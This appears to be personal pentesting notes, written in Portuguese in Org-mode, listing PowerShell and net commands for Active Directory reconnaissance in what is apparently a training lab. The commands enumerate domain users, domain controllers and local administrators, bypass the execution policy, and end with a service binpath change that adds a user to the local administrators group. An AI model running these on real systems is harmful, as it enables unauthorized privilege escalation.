* basic infos
busca por users no domain -->
#+begin_src powershell
net user /domain
#+end_src

uso do powershell com bypass de policy -->
#+begin_src powershell
powershell -ep bypass
#+end_src

pegar os DCs do ambiente -->
#+begin_src powershell
Get-ADDomainController -Filter * | Select-Object HostName
#+end_src

#+begin_src powershell
Get-ADUser -Filter *
#+end_src

pegar users de um grupo especifico, ou simplesmente listar users existentes nos grupos locais -->
#+begin_src powershell
net localgroup administrators
#+end_src


#+begin_src powershell
sc config snmptrap binpath="net localgroup administrators cyberwarfare\employee /add"
#+end_src
